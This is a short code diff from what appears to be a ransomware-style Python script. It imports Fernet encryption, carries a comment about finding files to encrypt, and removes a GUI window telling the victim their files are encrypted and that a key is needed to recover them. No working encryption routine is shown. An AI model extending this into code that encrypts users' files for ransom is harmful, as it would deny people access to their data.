@@ -2,29 +2,6 @@
 
 import os
 from cryptography.fernet import Fernet
-import customtkinter
-
-
-#GUI
-customtkinter.set_appearance_mode("dark")
-customtkinter.set_default_color_theme("blue")
-
-root = customtkinter.CTk()
-root.geometry("500x350")
-
-
-print ("Files Encrypted")
-
-frame = customtkinter.CTkFrame(master=root)
-frame.pack(pady=20, padx=60, fill="both", expand=True)
-
-label = customtkinter.CTkLabel(master=frame, text="Files have been encrypted", font=("Roboto",24))
-label.pack(pady=12, padx=10)
-
-label = customtkinter.CTkLabel(master=frame, text="Use the Decryption key and password to recover them :(", font=("Roboto",14))
-label.pack(pady=12, padx=10)
-
-root.mainloop()
 
 #find files to encrypt
 
